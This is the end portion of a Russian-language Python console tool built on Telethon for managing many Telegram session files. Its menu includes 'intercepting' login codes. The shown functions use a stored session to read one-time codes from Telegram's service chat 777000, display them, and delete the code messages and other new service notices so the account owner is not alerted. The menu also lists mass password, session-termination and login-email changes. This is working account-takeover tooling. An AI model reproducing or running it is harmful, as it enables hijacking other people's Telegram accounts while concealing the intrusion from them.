                        str(i), session_name, phone, name,
                        username, str(me.id), has_2fa, devices,
                        email_status, f"[dim]{device_short}[/]")
                else:
                    table.add_row(
                        str(i), session_name,
                        "[red]НЕ АВТОРИЗОВАН[/]",
                        "", "", "", "", "", "",
                        f"[dim]{device_short}[/]")
            except Exception as e:
                table.add_row(
                    str(i), session_name, f"[red]ERR[/]",
                    f"[dim]{str(e)[:20]}[/]",
                    "", "", "", "", "",
                    f"[dim]{device_short}[/]")
            finally:
                await client.disconnect()

    console.print(table)
    wait_enter()


# ───────── 7. ПОЛУЧИТЬ КОД ВХОДА ─────────

async def get_login_code():
    header("ПОЛУЧИТЬ КОД ВХОДА ПО НОМЕРУ")
    console.print(
        "  [dim]Запрашивает код входа. Если есть сессия "
        "этого номера —[/]")
    console.print(
        "  [dim]код будет перехвачен автоматически.[/]")
    console.print()

    phone = Prompt.ask("  [cyan]Номер телефона (с +)[/]").strip()
    if not phone.startswith("+"):
        phone = "+" + phone
    phone_clean = phone.replace("+", "").replace(
        " ", "").replace("-", "")

    sessions = get_session_files()
    has_session = phone_clean in sessions

    temp_session = os.path.join(SESSIONS_DIR,
                                f"_temp_{phone_clean}")
    client = create_client(temp_session)
    catcher_client = None

    try:
        await client.connect()

        with console.status(
            f"[cyan]Запрос кода на {phone}...[/]",
            spinner="dots",
        ):
            try:
                sent = await client.send_code_request(phone)
            except errors.FloodWaitError as e:
                console.print(
                    f"  [red]❌ Flood wait — подождите "
                    f"{format_seconds(e.seconds)}[/]")
                wait_enter()
                return
            except errors.PhoneNumberInvalidError:
                console.print("  [red]❌ Неверный номер[/]")
                wait_enter()
                return
            except Exception as e:
                console.print(f"  [red]❌ {e}[/]")
                wait_enter()
                return

        console.print(
            f"  [green]✅ Код отправлен![/] "
            f"Тип: [dim]{sent.type.__class__.__name__}[/]")

        if has_session:
            console.print(
                f"  [cyan]🔍 Сессия {phone_clean} найдена "
                f"— перехват кода...[/]")
            catcher_client = get_client(phone_clean)
            try:
                await catcher_client.connect()
                if await catcher_client.is_user_authorized():
                    code_found = None

                    with Progress(
                        SpinnerColumn(),
                        TextColumn("[cyan]Ожидаю сообщение...[/]"),
                        BarColumn(bar_width=30),
                        TextColumn(
                            "[dim]{task.completed}с / 30с[/]"),
                        console=console,
                    ) as progress:
                        task = progress.add_task("wait", total=30)
                        for attempt in range(15):
                            await asyncio.sleep(2)
                            progress.update(
                                task, completed=(attempt + 1) * 2)
                            try:
                                async for message in \
                                        catcher_client.iter_messages(
                                            777000, limit=3):
                                    msg_text = message.text or ""
                                    codes = re.findall(
                                        r'\b(\d{5,6})\b', msg_text)
                                    if codes:
                                        code_found = codes[0]
                                        try:
                                            await message.delete()
                                        except:
                                            pass
                                        break
                            except:
                                pass
                            if code_found:
                                break

                    if code_found:
                        console.print()
                        console.print(Panel(
                            Align.center(Text(
                                f"🔑  КОД: {code_found}",
                                style="bold green on black")),
                            border_style="green",
                            box=DOUBLE,
                            padding=(1, 6),
                        ))
                        console.print(
                            "  [dim]🗑️  Сообщение удалено[/]")
                    else:
                        console.print(
                            "  [yellow]⚠️  Код не перехвачен "
                            "автоматически[/]")
                else:
                    console.print(
                        "  [yellow]⚠️  Сессия не авторизована[/]")
            except Exception as e:
                console.print(
                    f"  [yellow]⚠️  Ошибка перехвата: {e}[/]")
            finally:
                await catcher_client.disconnect()
                catcher_client = None
        else:
            console.print(
                f"  [dim]ℹ️  Сессия не найдена — "
                f"код придёт на устройство[/]")

        console.print()
        action = Prompt.ask(
            "  Ввести код и создать сессию?",
            choices=["да", "нет"], default="нет")
        if action == "да":
            code = Prompt.ask("  [cyan]Код[/]").strip()
            if code:
                try:
                    try:
                        await client.sign_in(phone, code)
                    except errors.SessionPasswordNeededError:
                        pwd = Prompt.ask(
                            "  [cyan]Облачный пароль[/]",
                            password=True).strip()
                        await client.sign_in(password=pwd)
                    me = await client.get_me()
                    console.print(
                        f"  [green]✅ Вход: {me.first_name} "
                        f"(@{me.username}) ID:{me.id}[/]")
                    try:
                        await asyncio.sleep(1)
                        async for dialog in client.iter_dialogs():
                            if dialog.entity.id == 777000:
                                async for message in \
                                        client.iter_messages(
                                            777000, limit=5):
                                    if code in (
                                            message.text or ""):
                                        await message.delete()
                                        console.print(
                                            "  [dim]🗑️  "
                                            "Код удалён[/]")
                                        break
                                break
                    except:
                        pass
                    await client.disconnect()
                    temp_file = temp_session + ".session"
                    final_file = os.path.join(
                        SESSIONS_DIR, phone_clean + ".session")
                    if os.path.exists(final_file):
                        os.remove(final_file)
                    if os.path.exists(temp_file):
                        os.rename(temp_file, final_file)
                    console.print(
                        f"  [green]📁 sessions/"
                        f"{phone_clean}.session[/]")
                    wait_enter()
                    return
                except errors.PhoneCodeInvalidError:
                    console.print("  [red]❌ Неверный код[/]")
                except errors.PhoneCodeExpiredError:
                    console.print("  [red]❌ Код просрочен[/]")
                except Exception as e:
                    console.print(f"  [red]❌ {e}[/]")

    except Exception as e:
        console.print(f"  [red]❌ {e}[/]")
    finally:
        try:
            await client.disconnect()
        except:
            pass
        if catcher_client:
            try:
                await catcher_client.disconnect()
            except:
                pass
        temp_file = temp_session + ".session"
        if os.path.exists(temp_file):
            try:
                os.remove(temp_file)
            except:
                pass

    wait_enter()


# ───────── 8. ПЕРЕХВАТ КОДА ЧЕРЕЗ СЕССИЮ ─────────

async def _load_session_info(sessions):
    """Загружает информацию о сессиях."""
    info = []
    for s in sessions:
        client = get_client(s)
        try:
            await client.connect()
            if await client.is_user_authorized():
                me = await client.get_me()
                phone = format_phone(me.phone)
                phone_raw = str(me.phone or "")
                name = ((me.first_name or "") + " " +
                        (me.last_name or "")).strip()
                info.append((s, me, phone, phone_raw, name, True))
            else:
                info.append(
                    (s, None, "—", "", "НЕ АВТОРИЗОВАН", False))
        except Exception as e:
            info.append(
                (s, None, "—", "",
                 f"ОШИБКА: {str(e)[:25]}", False))
        finally:
            await client.disconnect()
    return info


async def _intercept_code_from_client(
        client, last_msg_id_before, timeout=60):
    """Ожидает новое сообщение с кодом от 777000."""
    max_attempts = timeout // 2
    with Progress(
        SpinnerColumn("dots"),
        TextColumn("[cyan]Ожидаю код...[/]"),
        BarColumn(bar_width=35, style="cyan",
                  complete_style="green"),
        TextColumn(
            "[dim]{task.completed}с / {task.total}с[/]"),
        console=console,
        transient=True,
    ) as progress:
        task = progress.add_task("wait", total=timeout)
        for attempt in range(max_attempts):
            await asyncio.sleep(2)
            progress.update(task, completed=(attempt + 1) * 2)
            try:
                async for message in client.iter_messages(
                        777000, limit=5):
                    if message.id <= last_msg_id_before:
                        continue
                    msg_text = message.text or ""
                    codes = re.findall(
                        r'\b(\d{5,6})\b', msg_text)
                    if codes:
                        return codes[0], message
            except:
                pass
    return None, None


async def _show_intercepted_code(
        code_found, code_message, client, last_msg_id_before):
    """Показывает перехваченный код и удаляет сообщения."""
    console.print()
    console.print(Panel(
        Align.center(Text(
            f"🔑  КОД ВХОДА: {code_found}",
            style="bold bright_green")),
        border_style="green",
        box=DOUBLE,
        padding=(1, 4),
    ))
    console.print()

    msg_text = code_message.text or ""
    if len(msg_text) > 120:
        console.print(f"  [dim]📝 {msg_text[:120]}...[/]")
    else:
        console.print(f"  [dim]📝 {msg_text}[/]")
    console.print()

    try:
        await code_message.delete()
        console.print(
            "  [green]🗑️  Сообщение с кодом удалено[/]")
    except Exception as e:
        console.print(
            f"  [yellow]⚠️  Не удалось удалить: {e}[/]")

    try:
        deleted_extra = 0
        async for msg in client.iter_messages(777000, limit=10):
            if msg.id <= last_msg_id_before:
                break
            if msg.id != code_message.id:
                try:
                    await msg.delete()
                    deleted_extra += 1
                except:
                    pass
        if deleted_extra > 0:
            console.print(
                f"  [dim]🗑️  Удалено ещё "
                f"{deleted_extra} сообщений[/]")
    except:
        pass


async def intercept_code_via_session():
    header("ПЕРЕХВАТ КОДА ВХОДА ЧЕРЕЗ СЕССИЮ")
    console.print(
        "  [dim]Используйте существующую сессию "
        "для перехвата кода.[/]")
    console.print(
        "  [dim]Код будет получен из чата Telegram "
        "(ID 777000),[/]")
    console.print("  [dim]показан вам и удалён.[/]")
    console.print()

    sessions = get_session_files()
    if not sessions:
        no_sessions()
        return

    console.print("  Как найти сессию?")
    console.print()
    console.print(
        "  [yellow][1][/] Показать все сессии и выбрать")
    console.print("  [yellow][2][/] Найти по номеру телефона")
    console.print()

    search_mode = Prompt.ask("  [cyan]Выбор[/]",
                             choices=["1", "2"], default="1")

    with console.status("[cyan]Загрузка сессий...[/]",
                        spinner="dots"):
        session_info = await _load_session_info(sessions)

    chosen_idx = None

    if search_mode == "2":
        search_phone = Prompt.ask(
            "  [cyan]Введите номер (полный или часть)[/]"
        ).strip()
        search_clean = (search_phone.replace("+", "")
                        .replace(" ", "").replace("-", "")
                        .replace("(", "").replace(")", ""))

        matches = []
        for idx, (s, me, phone, phone_raw, name, ok) in \
                enumerate(session_info):
            if not ok:
                continue
            if (search_clean in s
                or search_clean in phone_raw
                or search_clean in phone.replace(
                    "+", "").replace(" ", "")):
                matches.append(idx)

        if not matches:
            console.print()
            console.print(
                f"  [red]❌ Сессия с номером "
                f"«{search_phone}» не найдена[/]")
            console.print()
            show_all = Prompt.ask(
                "  Показать все сессии?",
                choices=["да", "нет"], default="да")
            if show_all == "нет":
                wait_enter()
                return
            matches = list(range(len(session_info)))

        if len(matches) == 1:
            chosen_idx = matches[0]
            s, me, phone, _, name, _ = session_info[chosen_idx]
            console.print()
            console.print(
                f"  [green]✅ Найдена:[/] {name} "
                f"({phone}) — [dim]{s}[/]")
        else:
            console.print()
            console.print(
                f"  Найдено: [bold]{len(matches)}[/]")
            console.print()

            match_table = Table(
                box=ROUNDED, border_style="blue",
                header_style="bold cyan", padding=(0, 1))
            match_table.add_column(
                "#", style="yellow bold", width=4,
                justify="center")
            match_table.add_column(
                "Сессия", style="white", min_width=16)
            match_table.add_column(
                "Телефон", style="bright_white", min_width=16)
            match_table.add_column("Имя", style="white")
            for display_i, real_idx in enumerate(matches, 1):
                s, me, phone, _, name, ok = \
                    session_info[real_idx]
                status = name if ok else f"[red]{name}[/]"
                match_table.add_row(
                    str(display_i), s, phone, status)
            console.print(match_table)
            console.print()

            num = Prompt.ask(
                "  [cyan]Номер сессии[/]").strip()
            try:
                n = int(num) - 1
                if n < 0 or n >= len(matches):
                    console.print(
                        "  [red]❌ Неверный номер[/]")
                    wait_enter()
                    return
                chosen_idx = matches[n]
            except ValueError:
                console.print("  [red]❌ Неверный ввод[/]")
                wait_enter()
                return

    else:
        table = Table(
            title="[bold]Доступные сессии[/]",
            box=ROUNDED,
            border_style="blue",
            header_style="bold cyan",
            padding=(0, 1),
        )
        table.add_column(
            "#", style="yellow bold", width=4,
            justify="center")
        table.add_column(
            "Сессия", style="white", min_width=16)
        table.add_column(
            "Телефон", style="bright_white", min_width=16)
        table.add_column(
            "Имя", style="white", min_width=14)
        table.add_column(
            "Статус", justify="center", width=8)

        for i, (s, me, phone, _, name, ok) in \
                enumerate(session_info, 1):
            if ok:
                table.add_row(str(i), s, phone, name,
                              "[green]●[/]")
            else:
                table.add_row(str(i), s, "—",
                              f"[red]{name}[/]", "[red]●[/]")

        console.print(table)
        console.print()

        num = Prompt.ask("  [cyan]Номер сессии[/]").strip()
        try:
            n = int(num) - 1
            if n < 0 or n >= len(session_info):
                console.print("  [red]❌ Неверный номер[/]")
                wait_enter()
                return
            chosen_idx = n
        except ValueError:
            console.print("  [red]❌ Неверный ввод[/]")
            wait_enter()
            return

    session_name, me, phone, phone_raw, name, ok = \
        session_info[chosen_idx]
    if not ok:
        console.print(
            "  [red]❌ Сессия не авторизована или ошибка[/]")
        wait_enter()
        return

    console.print()
    info_panel = Table(
        show_header=False, box=ROUNDED,
        border_style="green", padding=(0, 2))
    info_panel.add_column("", style="dim")
    info_panel.add_column("", style="bold")
    info_panel.add_row("Сессия", session_name)
    info_panel.add_row(
        "Аккаунт",
        f"{me.first_name} (@{me.username or '—'})")
    info_panel.add_row("Телефон", phone)
    console.print(Panel(
        info_panel,
        title="[green]Выбранная сессия[/]",
        border_style="green"))
    console.print()

    client = get_client(session_name)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            console.print(
                "  [red]❌ Сессия не авторизована[/]")
            wait_enter()
            return

        last_msg_id_before = 0
        try:
            async for msg in client.iter_messages(
                    777000, limit=1):
                last_msg_id_before = msg.id
        except:
            pass

        console.print("  Что делаем?")
        console.print()
        console.print(
            "  [yellow][1][/] Ожидать код (запрос извне)")
        console.print(
            "  [yellow][2][/] Запросить код прямо здесь")
        console.print()

        mode = Prompt.ask("  [cyan]Выбор[/]",
                          choices=["1", "2"], default="1")

        if mode == "2":
            target_phone = Prompt.ask(
                f"  [cyan]Номер для входа[/] "
                f"[dim](Enter = {phone})[/]",
                default="").strip()
            if not target_phone:
                target_phone = phone
            if not target_phone.startswith("+"):
                target_phone = "+" + target_phone

            target_clean = (target_phone.replace("+", "")
                            .replace(" ", "")
                            .replace("-", ""))
            temp_session = os.path.join(
                SESSIONS_DIR,
                f"_temp_intercept_{target_clean}")
            temp_client = create_client(temp_session)

            try:
                await temp_client.connect()
                with console.status(
                    f"[cyan]Запрос кода на "
                    f"{target_phone}...[/]",
                    spinner="dots",
                ):
                    try:
                        sent = await \
                            temp_client.send_code_request(
                                target_phone)
                        console.print(
                            f"  [green]✅ Код запрошен![/] "
                            f"Тип: [dim]"
                            f"{sent.type.__class__.__name__}"
                            f"[/]")
                    except errors.FloodWaitError as e:
                        console.print(
                            f"  [red]❌ Flood wait — "
                            f"{format_seconds(e.seconds)}[/]")
                        wait_enter()
                        return
                    except errors.PhoneNumberInvalidError:
                        console.print(
                            "  [red]❌ Неверный номер[/]")
                        wait_enter()
                        return
                    except Exception as e:
                        console.print(f"  [red]❌ {e}[/]")
                        wait_enter()
                        return
            finally:
                await temp_client.disconnect()
                temp_file = temp_session + ".session"
                if os.path.exists(temp_file):
                    try:
                        os.remove(temp_file)
                    except:
                        pass

        console.print()
        code_found, code_message = \
            await _intercept_code_from_client(
                client, last_msg_id_before, timeout=60)

        if code_found:
            await _show_intercepted_code(
                code_found, code_message,
                client, last_msg_id_before)
        else:
            console.print()
            console.print(Panel(
                "[red]❌ Код не получен за 60 секунд[/]\n\n"
                "[dim]Возможные причины:\n"
                "  • Код не был запрошен\n"
                "  • Код пришёл по SMS, а не в Telegram\n"
                "  • Аккаунт получает коды на "
                "другое устройство[/]",
                border_style="red",
            ))

    except Exception as e:
        console.print(f"  [red]❌ Ошибка: {e}[/]")
    finally:
        try:
            await client.disconnect()
        except:
            pass

    wait_enter()


# ───────── ГЛАВНЫЙ ЦИКЛ ─────────

async def main():
    while True:
        print_menu()
        choice = Prompt.ask(
            "  [bold cyan]Выберите пункт[/]").strip()

        if choice == "1":
            await create_session()
        elif choice == "2":
            await manage_cloud_password()
        elif choice == "3":
            await terminate_all_sessions()
        elif choice == "4":
            await set_login_email_all()
        elif choice == "5":
            await set_login_email_selected()
        elif choice == "6":
            await list_sessions()
        elif choice == "7":
            await get_login_code()
        elif choice == "8":
            await intercept_code_via_session()
        elif choice == "0":
            console.print("\n  [dim]👋 До свидания![/]\n")
            break
        else:
            console.print("  [red]❌ Неверный выбор[/]")
            await asyncio.sleep(1)


if __name__ == "__main__":
    asyncio.run(main())